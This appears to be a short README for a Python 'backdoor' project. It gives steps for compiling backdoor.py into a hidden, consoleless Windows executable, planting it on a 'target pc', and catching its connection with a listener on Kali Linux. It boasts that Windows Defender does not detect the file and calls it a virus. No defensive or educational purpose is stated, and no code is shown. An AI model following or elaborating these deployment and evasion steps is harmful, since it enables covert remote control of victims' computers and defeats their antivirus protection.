# Backdoor-python-project
Socket library in python allows us to establish connection between 2 machines 
Install pyinstaller in windows machine 
To run this project we need a windows environment, in windows ‘pyinstaller backdoor.py —onefile —noconsole’ 
This command compiles the python program , backdoor.py has to be in the target pc and server.py has to be in the host kali linux.
All libraries needed should be previously installed in order to make this program work 
After doing this we will see 4 new folders appear, folder named Dist is important and we can delete the other 3 
Cool part is that if we scan it using latest windows defender, it will go undetected 
To make this work, make sure the ip address and port are correctly set 
‘Python3 server.py’ will start listenning for connections 
Now if backdoor file is clicked, within 20 secs we will establish connection
Commands like whom etc can be used to ensure connection
PLEASE NOTE- THIS IS A VIRUS
